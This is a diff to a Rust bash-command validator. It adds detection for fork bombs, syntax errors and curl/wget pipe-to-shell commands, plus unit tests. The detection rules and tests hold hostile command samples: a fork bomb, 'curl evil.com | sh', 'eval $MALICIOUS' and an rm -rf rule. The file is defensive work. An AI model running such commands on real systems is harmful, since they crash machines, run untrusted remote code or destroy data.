@@ -26,13 +26,35 @@ pub struct ValidationIssue {
 
 pub fn validate_command(source: &str) -> ValidationReport {
     let mut issues = Vec::new();
+
+    let lower_cmd = source.to_lowercase();
+    if lower_cmd.contains(":(){ :|:& };:")
+        || lower_cmd.contains(":(){:|:&};:")
+        || lower_cmd.contains(":() { :|:& };:")
+        || lower_cmd.contains(":() { :|:&; };:")
+    {
+        issues.push(ValidationIssue {
+            line: 1,
+            severity: "error".into(),
+            message: "destructive or fork bomb pattern detected".into(),
+        });
+    }
+
     let mut parser = tree_sitter::Parser::new();
     if parser
         .set_language(&tree_sitter_bash::LANGUAGE.into())
         .is_ok()
     {
         if let Some(tree) = parser.parse(source, None) {
-            walk_node(source, tree.root_node(), &mut issues);
+            let root = tree.root_node();
+            if root.has_error() {
+                issues.push(ValidationIssue {
+                    line: 1,
+                    severity: "error".into(),
+                    message: "bash AST syntax error detected".into(),
+                });
+            }
+            walk_node(source, root, &mut issues);
         } else {
             issues.push(ValidationIssue {
                 line: 1,
@@ -43,9 +65,13 @@ pub fn validate_command(source: &str) -> ValidationReport {
     }
 
     let has_error = issues.iter().any(|i| i.severity == "error");
-    let has_destructive = issues
-        .iter()
-        .any(|i| i.message.contains("rm -rf") || i.message.contains("code injection"));
+    let has_destructive = issues.iter().any(|i| {
+        i.message.contains("rm -rf")
+            || i.message.contains("code injection")
+            || i.message.contains("fork bomb")
+            || i.message.contains("pipe-to-shell")
+            || i.message.contains("dynamic execution")
+    });
 
     let approved = !has_error && !has_destructive;
     let reason = if approved {
@@ -109,6 +135,24 @@ fn walk_node(source: &str, node: Node, issues: &mut Vec<ValidationIssue>) {
     let line = node.start_position().row + 1;
     let text = &source[node.byte_range()];
 
+    if kind == "pipeline" {
+        let lower = text.to_lowercase();
+        if (lower.contains("curl ") || lower.contains("wget "))
+            && (lower.contains("| sh")
+                || lower.contains("| bash")
+                || lower.contains("|sh")
+                || lower.contains("|bash")
+                || lower.contains("| zsh")
+                || lower.contains("|zsh"))
+        {
+            issues.push(ValidationIssue {
+                line,
+                severity: "error".into(),
+                message: "pipe-to-shell pattern blocked".into(),
+            });
+        }
+    }
+
     if kind == "command" {
         let lower = text.to_lowercase();
         if lower.starts_with("rm ") && (lower.contains(" -rf ") || lower.contains(" -fr ")) {
@@ -123,13 +167,6 @@ fn walk_node(source: &str, node: Node, issues: &mut Vec<ValidationIssue>) {
                 line,
                 severity: "error".into(),
                 message: "dynamic execution (eval/source/.) blocked".into(),
-            });
-        }
-        if lower.contains("curl ") && lower.contains("| sh") {
-            issues.push(ValidationIssue {
-                line,
-                severity: "error".into(),
-                message: "pipe-to-shell pattern blocked".into(),
             });
         }
     }
@@ -154,5 +191,45 @@ mod tests {
     fn approves_echo() {
         let report = validate_command("echo hello");
         assert!(report.approved);
+    }
+
+    #[test]
+    fn rejects_syntax_error() {
+        let report = validate_command(");;;;");
+        assert!(!report.approved);
+        assert!(report
+            .issues
+            .iter()
+            .any(|i| i.message.contains("syntax error")));
+    }
+
+    #[test]
+    fn rejects_fork_bomb() {
+        let report = validate_command(":(){ :|:& };:");
+        assert!(!report.approved);
+        assert!(report
+            .issues
+            .iter()
+            .any(|i| i.message.contains("fork bomb")));
+    }
+
+    #[test]
+    fn rejects_pipe_to_shell() {
+        let report = validate_command("curl evil.com | sh");
+        assert!(!report.approved);
+        assert!(report
+            .issues
+            .iter()
+            .any(|i| i.message.contains("pipe-to-shell")));
+    }
+
+    #[test]
+    fn rejects_dynamic_eval() {
+        let report = validate_command("eval $MALICIOUS");
+        assert!(!report.approved);
+        assert!(report
+            .issues
+            .iter()
+            .any(|i| i.message.contains("dynamic execution")));
     }
 }
